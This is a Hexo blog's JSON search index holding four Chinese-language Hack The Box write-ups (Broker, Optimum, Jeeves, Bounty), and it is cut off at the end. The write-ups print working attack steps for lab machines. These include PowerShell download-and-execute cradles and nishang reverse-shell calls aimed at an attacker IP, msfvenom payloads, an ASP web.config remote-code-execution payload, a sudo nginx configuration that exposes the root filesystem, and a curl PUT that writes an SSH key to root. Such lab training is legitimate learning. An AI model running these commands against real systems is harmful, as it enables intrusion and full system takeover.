{"meta":{"title":"Yao","subtitle":"Study Note","description":"","author":"Yao","url":"https://bzyfjb.github.io","root":"/"},"pages":[{"title":"","date":"2023-08-20T06:21:38.322Z","updated":"2023-08-20T06:21:38.322Z","comments":true,"path":"mylist/index.html","permalink":"https://bzyfjb.github.io/mylist/index.html","excerpt":"","text":""},{"title":"","date":"2023-08-20T06:23:11.737Z","updated":"2023-08-20T06:23:11.737Z","comments":true,"path":"404.html","permalink":"https://bzyfjb.github.io/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"所有标签","date":"2023-08-20T06:20:57.498Z","updated":"2023-08-20T06:20:57.498Z","comments":true,"path":"tags/index.html","permalink":"https://bzyfjb.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-08-20T06:19:39.977Z","updated":"2023-08-20T06:19:39.977Z","comments":true,"path":"about/index.html","permalink":"https://bzyfjb.github.io/about/index.html","excerpt":"","text":"focus on “自我成长”"},{"title":"所有分类","date":"2023-08-20T06:20:20.553Z","updated":"2023-08-20T06:20:20.553Z","comments":true,"path":"categories/index.html","permalink":"https://bzyfjb.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HTB-Broker","slug":"HTB-Broker","date":"2023-11-15T14:45:56.000Z","updated":"2023-11-15T14:48:55.400Z","comments":true,"path":"HTB-Broker.html","link":"","permalink":"https://bzyfjb.github.io/HTB-Broker.html","excerpt":"","text":"1 Information1.1 nmap12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697┌──(kali㉿kali)-[~] └─$ nmap -p- --min-rate 10000 10.10.11.243 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 02:32 EST Warning: 10.10.11.243 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.243 Host is up (0.22s latency). Not shown: 63029 closed tcp ports (conn-refused), 2497 filtered tcp ports (no-response)PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1883/tcp open mqtt 5672/tcp open amqp 8161/tcp open patrol-snmp 37733/tcp open unknown 61613/tcp open unknown 61614/tcp open unknown 61616/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 104.81 seconds ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -p 22,80,1883,5672,8161,37733,61613,61614,61616 10.10.11.243 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 02:35 EST Nmap scan report for 10.10.11.243 Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Error 401 Unauthorized1883/tcp open mqtt|_mqtt-subscribe: Failed to receive control packet from server.5672/tcp open amqp?|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: | AMQP| AMQP| amqp:decode-error|_ 7Connection from client using unsupported AMQP attempted8161/tcp open http Jetty 9.4.39.v20210325| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-title: Error 401 Unauthorized|_http-server-header: Jetty(9.4.39.v20210325)37733/tcp open tcpwrapped61613/tcp open stomp Apache ActiveMQ | fingerprint-strings: | HELP4STOMP: | ERROR| content-type:text/plain| message:Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)|_ java.lang.Thread.run(Thread.java:750)61614/tcp open http Jetty 9.4.39.v20210325|_http-title: Site doesn&#x27;t have a title.| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Jetty(9.4.39.v20210325)61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings: | NULL: | ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| ProviderName | ActiveMQ| StackTraceEnabled| PlatformDetails | Java| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration| MaxInactivityDurationInitalDelay| ProviderVersion |_ 5.15.153 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :......Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 45.71 seconds 8161：ActiveMQ前台端口号，提供管理控制服务 61616：ActiveMQ默认后台端口号，提供JMS服务（JAVA消息服务） 1.2 WEB&#x20;访问80端口 使用弱口令admin:admin登录 通过“Manage ActiveMQ broker”跳转至&#x2F;admin,获得如下消息 2 WEB ShellActiveMQ 存在一个新的 CVE-2023-46604，是一个不需要认证的远程代码执行漏洞。 POC : https://github.com/evkl1d/CVE-2023-46604 根据POC的README可以轻松获得broker的webshell 3 Privilege3.1 sudo 提权提权先查看是否可执行sudo 12345678910activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -lsudo -lMatching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginxactivemq@broker:/opt/apache-activemq-5.15.15/bin$ 可以在启动一个恶意的nginx服务，将目录执行为根目录，甚至可以允许PUT请求 12345678910111213user root;events &#123; worker_connections 1024;&#125;http &#123; server &#123; listen 1337; root /; autoindex on; dav_methods PUT; &#125;&#125; nginx的配置文件 编辑好nginx的配置文件后，将其上传至目标机器 使用sudo nginx开启恶意服务 12activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/nginx.conf sudo /usr/sbin/nginx -c /home/activemq/nginx.conf 使用curl nginx服务进行本地文件读取 1234567891011121314activemq@broker:~$ curl http://127.0.0.1:1337/etc/passwd curl http://127.0.0.1:1337/etc/passwd % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1880 100 1880 0 0 1599k 0 --:--:-- --:--:-- --:--:-- 1835kroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...... 3.2 SSH登录本地生成ssh秘钥 将公钥写入目标机器 12activemq@broker:~$ curl -X PUT http://127.0.0.1:1337/root/.ssh/authorized_keys -d &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCONGEADNHteG1ndR7ctkZSxs7m/PNLsCBxJRozCU0AiAdiuWl/YTIqZMvIg/e9o5ftye0Wu46T91n1I30mzPiR2Lg7AVmxP7ngv2v3Crb3x/fl6sPwhBDKtFCZQnu.......&quot; SSH连接","categories":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/tags/HTB/"},{"name":"activeMQ","slug":"activeMQ","permalink":"https://bzyfjb.github.io/tags/activeMQ/"},{"name":"CVE-2023-46604","slug":"CVE-2023-46604","permalink":"https://bzyfjb.github.io/tags/CVE-2023-46604/"},{"name":"sudo","slug":"sudo","permalink":"https://bzyfjb.github.io/tags/sudo/"},{"name":"nginx","slug":"nginx","permalink":"https://bzyfjb.github.io/tags/nginx/"}],"author":"Yao"},{"title":"HTB-Optimum","slug":"HTB-Optimum","date":"2023-08-22T14:27:23.000Z","updated":"2023-08-22T14:30:11.577Z","comments":true,"path":"HTB-Optimum.html","link":"","permalink":"https://bzyfjb.github.io/HTB-Optimum.html","excerpt":"","text":"Information&#x20;nmap首先进行全端口扫描 1234567891011┌──(kali㉿kali)-[~]└─$ nmap -p- --min-rate 10000 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 07:09 EDTNmap scan report for 10.10.10.8Host is up (0.28s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 47.19 seconds 根据开放端口，进行详细信息扫描。 123456789101112131415┌──(kali㉿kali)-[~]└─$ nmap -sC -sV -p 80 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 07:12 EDTNmap scan report for 10.10.10.8Host is up (0.28s latency).PORT STATE SERVICE VERSION80/tcp open http HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds web访问80端口，页面信息如下 得知当前为HFS服务 WEB-GetShell在exploit-db找到了针对nfs的exploit，将exp保存到本地之后修改其中的ip和端口设置 然后使用python3执行脚本 可以直接获得powershell shell。 PrivilegeFind vulnerabilities这里因为系统版本为较早的旧版本，所以需要使用sherlock来找到可以利用的漏洞。 将Sherlock克隆到本地后，使用grep命令来搜索全部的方法 1234567891011121314151617181920212223┌──(kali㉿kali)-[~/Documents/htb/Optimum/Sherlock]└─$ grep -i function Sherlock.ps1function Get-FileVersionInfo ($FilePath) &#123;function Get-InstalledSoftware($SoftwareName) &#123;function Get-Architecture &#123;function Get-CPUCoreCount &#123;function New-ExploitTable &#123;function Set-ExploitTable ($MSBulletin, $VulnStatus) &#123;function Get-Results &#123;function Find-AllVulns &#123;function Find-MS10015 &#123;function Find-MS10092 &#123;function Find-MS13053 &#123;function Find-MS13081 &#123;function Find-MS14058 &#123;function Find-MS15051 &#123;function Find-MS15078 &#123;function Find-MS16016 &#123;function Find-MS16032 &#123;function Find-MS16034 &#123;function Find-CVE20177199 &#123;function Find-MS16135 &#123; 将Find-AllVulns添加后ps1脚本的最后。 12345678┌──(kali㉿kali)-[~/Documents/htb/Optimum/Sherlock]└─$ tail -5 Sherlock.ps1 Set-ExploitTable $MSBulletin $VulnStatus&#125;Find-AllVulns 本地开启http服务用来传输文件，在靶机的shell中使用IEX加载文件并执行 1IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14/Sherlock.ps1&#x27;) 查看sherlock的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475PS C:\\Users\\kostas\\Desktop&gt; IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14/Sherlock.ps1&#x27;) Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/VulnStatus : Not supported on 64-bit systemsTitle : Task Scheduler .XMLMSBulletin : MS10-092CVEID : 2010-3338, 2010-3888Link : https://www.exploit-db.com/exploits/19930/VulnStatus : Not VulnerableTitle : NTUserMessageCall Win32k Kernel Pool OverflowMSBulletin : MS13-053CVEID : 2013-1300Link : https://www.exploit-db.com/exploits/33213/VulnStatus : Not supported on 64-bit systemsTitle : TrackPopupMenuEx Win32k NULL PageMSBulletin : MS13-081CVEID : 2013-3881Link : https://www.exploit-db.com/exploits/31576/VulnStatus : Not supported on 64-bit systemsTitle : TrackPopupMenu Win32k Null Pointer DereferenceMSBulletin : MS14-058CVEID : 2014-4113Link : https://www.exploit-db.com/exploits/35101/VulnStatus : Not VulnerableTitle : ClientCopyImage Win32kMSBulletin : MS15-051CVEID : 2015-1701, 2015-2433Link : https://www.exploit-db.com/exploits/37367/VulnStatus : Not VulnerableTitle : Font Driver Buffer OverflowMSBulletin : MS15-078CVEID : 2015-2426, 2015-2433Link : https://www.exploit-db.com/exploits/38222/VulnStatus : Not VulnerableTitle : &#x27;mrxdav.sys&#x27; WebDAVMSBulletin : MS16-016CVEID : 2016-0051Link : https://www.exploit-db.com/exploits/40085/VulnStatus : Not supported on 64-bit systemsTitle : Secondary Logon HandleMSBulletin : MS16-032CVEID : 2016-0099Link : https://www.exploit-db.com/exploits/39719/VulnStatus : Appears VulnerableTitle : Windows Kernel-Mode Drivers EoPMSBulletin : MS16-034CVEID : 2016-0093/94/95/96Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?VulnStatus : Appears VulnerableTitle : Win32k Elevation of PrivilegeMSBulletin : MS16-135CVEID : 2016-7255Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135VulnStatus : Appears VulnerableTitle : Nessus Agent 6.6.2 - 6.10.3MSBulletin : N/A CVEID : 2017-7199Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.htmlVulnStatus : Not Vulnerable 存在漏洞的编号分别为MS16-032、MS16-034、MS16-135。选择利用MS16-032来进行提权。 Get system privilege使用的脚本有empire项目中的Invoke-MS16032.ps1，将文件保存到工作目录并对其进行修改，在文件最后添加如下代码 1Invoke-MS16032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14:808/shell.exe&#x27;)&quot; 调用Invoke-MS16032方法加载并执行shell.exe。shell.exe是通过msfvenom生成的shellcode 12345678┌──(kali㉿kali)-[~/Documents/htb/Optimum]└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=3333 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytes 通过msfconsole监听3333端口 123456789101112msf6 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 10.10.14.14lhost =&gt; 10.10.14.14msf6 exploit(multi/handler) &gt; set lport 3333lport =&gt; 3333msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.14.14:3333 在靶机shell加载并执行Invoke-MS16032，在msfconsole监听的3333端口失败了 经过排查，确认可能存在的问题为当前shell为32位的，对64位系统内核进行检测会失败 为了解决这个问题，获得一个msf shell，将进程迁移至64位进程 拿到meterpreter shell后，通过ps命令查看进程信息，迁移至64位进程 123456789101112meterpreter &gt; migrate 2140[*] Migrating from 2716 to 2140...[*] Migration completed successfully.meterpreter &gt; sysinfoComputer : OPTIMUMOS : Windows 2012 R2 (6.3 Build 9600).Architecture : x64System Language : el_GRDomain : HTBLogged On Users : 3Meterpreter : x64/windows 进程迁移后再次提权。 修改Invoke-PowerShellTcp.ps1进行reverse shell，在最后一行添加 1Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4444 修改Invoke-MS16032.ps1 ,在最后添加如下代码，使其加载Invoke-PowershellTcp.ps1进行反弹shell 1Invoke-MS16032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14:808/Invoke-PowerShellTcp.ps1&#x27;)&quot; 修改好文件之后，在本地监听4444端口。 在meterpreter shell中执行 1powershell iex(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.14:808/Invoke-MS16032.ps1&#x27;) 靶机执行powershell命令之后，本地http服务依次接收到&#x2F;Invoke-MS16032.ps1和&#x2F;Invoke-PowerShellTcp.ps1请求，最后在4444端口监听到system shell。 参考：https://0xdf.gitlab.io/2021/03/17/htb-optimum.html https://www.youtube.com/watch?v=kWTnVBIpNsE","categories":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/tags/HTB/"},{"name":"Windows","slug":"Windows","permalink":"https://bzyfjb.github.io/tags/Windows/"},{"name":"HFS","slug":"HFS","permalink":"https://bzyfjb.github.io/tags/HFS/"},{"name":"MS16032","slug":"MS16032","permalink":"https://bzyfjb.github.io/tags/MS16032/"},{"name":"Sherlock","slug":"Sherlock","permalink":"https://bzyfjb.github.io/tags/Sherlock/"},{"name":"Msf","slug":"Msf","permalink":"https://bzyfjb.github.io/tags/Msf/"},{"name":"nishang","slug":"nishang","permalink":"https://bzyfjb.github.io/tags/nishang/"}],"author":"Yao"},{"title":"HTB-Jeeves","slug":"HTB-Jeeves","date":"2023-08-20T05:35:32.000Z","updated":"2023-08-20T07:18:38.295Z","comments":true,"path":"HTB-Jeeves.html","link":"","permalink":"https://bzyfjb.github.io/HTB-Jeeves.html","excerpt":"","text":"Information&#x20;Port Scan使用nmap来做全端口扫描 1234567891011121314┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.63Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:41 EDTNmap scan report for 10.10.10.63 Host is up (0.27s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 Nmap done: 1 IP address (1 host up) scanned in 54.80 seconds 针对开放端口做详细的扫描 1234567891011121314151617181920212223242526272829303132333435┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -sC -sV -p 80,135,445,50000 10.10.10.63 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:56 EDTNmap scan report for 10.10.10.63Host is up (0.32s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: Ask Jeeves| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open http Jetty 9.4.z-SNAPSHOT|_http-title: Error 404 Not Found|_http-server-header: Jetty(9.4.z-SNAPSHOT)Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s| smb2-time: | date: 2023-08-19T16:56:42|_ start_date: 2023-08-19T16:40:30| smb2-security-mode: | 311: |_ Message signing enabled but not required| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.06 seconds 已知运行服务为Microsoft IIS httpd 10.0，那么系统可能为windows10 或windows Server 2016及以上版本。 WEB-80 输入内容并提交表单，得到信息如下： 通过查看源码可以发现当前响应为图片。 WEB - 50000 目录遍历123456789101112131415161718┌──(kali㉿kali)-[~/Documents/htb] └─$ gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.63:50000[+] Method: GET[+] Threads: 30[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.5[+] Timeout: 10s===============================================================2023/08/20 00:54:36 Starting gobuster in directory enumeration mode ===============================================================/askjeeves (Status: 302) [Size: 0] [--&gt; http://10.10.10.63:50000/askjeeves/] WEB&#x20;根据对50000端口的目录遍历得到的结果，访问&#x2F;askjeeves目录 jenkins RCE访问http://10.10.10.63:50000/askjeeves/ 此处有jenkins未授权访问漏洞 选择”manage Jenkins”- - &gt; “Script Console” 输入poc进行测试 1print &quot;whoami&quot;.execute().text 成功执行命令，那么下一步便是获取shell Getshell使用nishang获取shell，将nishang复制到当前目录并修改文件，在文件的最后添加如下内容： 1Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 1234 修改好文件之后，利用python开始web服务同时使用nc监听1234端口，即可得到shell。 Privilege123456789101112131415PS C:\\Users\\Administrator\\.jenkins&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= ========SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone Disabled 尝试使用JuicyPotato 进行提权 To msf shell# 这一步可以不做 将ps1 shell转换成msf shell，先利用msfvenom生成shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=1235 -f psh-reflection &gt;1.ps1 开启http服务提供下载功能 1python -m http.server 808 msfconsole开启监听 123456msfconsolemsf6 &gt; use exploit/multi/handler msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LhOST 10.10.14.12msf6 exploit(multi/handler) &gt; set lport 1235msf6 exploit(multi/handler) &gt; run 在目标机执行msfvenom生成的shellcode 12powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.12:808/1.ps1&#x27;);1.ps1&quot; JuicyPotato使用juicyPotato提权，不过相较Bounty靶机的不同，jeeves获取的权限是不一致的，需要修改-t参数，因为只有SeImpersonatePrivilege 权限，需要将-t参数设置为-t t，具体参考juicy potato","categories":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/tags/HTB/"},{"name":"windows","slug":"windows","permalink":"https://bzyfjb.github.io/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"https://bzyfjb.github.io/tags/juicy-potato/"},{"name":"nishang","slug":"nishang","permalink":"https://bzyfjb.github.io/tags/nishang/"},{"name":"jenkins","slug":"jenkins","permalink":"https://bzyfjb.github.io/tags/jenkins/"},{"name":"RCE","slug":"RCE","permalink":"https://bzyfjb.github.io/tags/RCE/"}],"author":"Yao"},{"title":"HTB-Bounty","slug":"HTB-Bounty","date":"2023-08-17T14:54:08.000Z","updated":"2023-08-17T15:31:22.387Z","comments":true,"path":"HTB-Bounty.html","link":"","permalink":"https://bzyfjb.github.io/HTB-Bounty.html","excerpt":"","text":"Informationnmap1234567891011┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.93Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 08:21 EDTNmap scan report for 10.10.10.93Host is up (0.26s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 50.01 seconds 1234567891011121314151617┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -sC -sV -p 80 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 08:22 EDTNmap scan report for 10.10.10.93Host is up (0.29s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-title: Bounty|_http-server-header: Microsoft-IIS/7.5Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds WEB shellbasic information访问Web页面，同时根据插件得到信息： 结合microsoft IIS 版本对应关系，当前系统应为Windows Server 2008R2 File Upload&#x2F;transfer.aspx 看起来是个文件上传表单，那么尝试进行文件上传。选择一个正确的图片文件进行上传，回显信息是“successfuly” 修改文件后缀名为“aspx”，再次发送请求包，此时的相应为“Invalid file” BruteForce将其他asp文件后缀放进字典进行爆破 1ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml 在Intruder模块中，将后缀名设置为参数，导入字典，并取消URL编码的选项。 对后缀名进行爆破的结果是允许config后缀文件上传。 Asp config RCE在这篇博客中找到文件上传导致命令执行的POC。将POC保存至web.config进行上传 1234567891011121314151617181920212223242526&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! &lt;%Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)&#x27; it is running the ASP code if you can see 3 by opening the web.config file!Response.write(1+2)Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;)%&gt;--&gt; 上传web.config文件后，访问&#x2F;UploadedFiles目录下的web.config 将aspx命令执行代码，替换原POC中代码。用ping命令进行测试，本地可以接受到来自目标机的icmp数据 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;cmd /c ping 10.10.14.15&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; Msf Shellmsfvenom生成shellcode 12msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f exe &gt; shell.exe msfconsole设置监听 利用命令执行将shellcode传输至目标机 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;certutil -urlcache -f http://10.10.14.15:808/shell.exe C:\\\\Users\\\\Public\\\\Documents\\\\shell.exe&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; 再次利用命令执行，运行shellcode 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;cmd /c C:\\Users\\Public\\Documents\\shell.exe&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; 即可在msfconsole获得shell privilege查看权限 具有SeAssignPrimaryTokenPrivilege和SeImpersonatePrivilege权限 systeminfo 1234567891011121314151617181920212223242526272829303132333435363738394041424344c:\\windows\\system32\\inetsrv&gt;systeminfo systeminfo Host Name: BOUNTY OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 55041-402-3606965-84760Original Install Date: 5/30/2018, 12:22:24 AMSystem Boot Time: 8/16/2023, 3:12:27 PMSystem Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 MhzBIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC+02:00) Athens, Bucharest, IstanbulTotal Physical Memory: 2,047 MBAvailable Physical Memory: 1,618 MBVirtual Memory: Max Size: 4,095 MBVirtual Memory: Available: 3,643 MBVirtual Memory: In Use: 452 MBPage File Location(s): C:\\pagefile.sysDomain: WORKGROUPLogon Server: N/AHotfix(s): N/ANetwork Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.93 编辑Shells&#x2F;Invoke-PowerShellTcp.ps1文件，在末尾加 1Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 6666 新建sh.bat文件 1powershell -c IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.15:808/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -port 6666 使用certutil将sh.bat和juicy potato均传输到目标机上 1certutil -urlcache -f http://10.10.14.15:808/jp.exe jp.exe 执行juicy potato 获得system权限的shell","categories":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/tags/HTB/"},{"name":"windows","slug":"windows","permalink":"https://bzyfjb.github.io/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"https://bzyfjb.github.io/tags/juicy-potato/"}]},{"title":"Hello 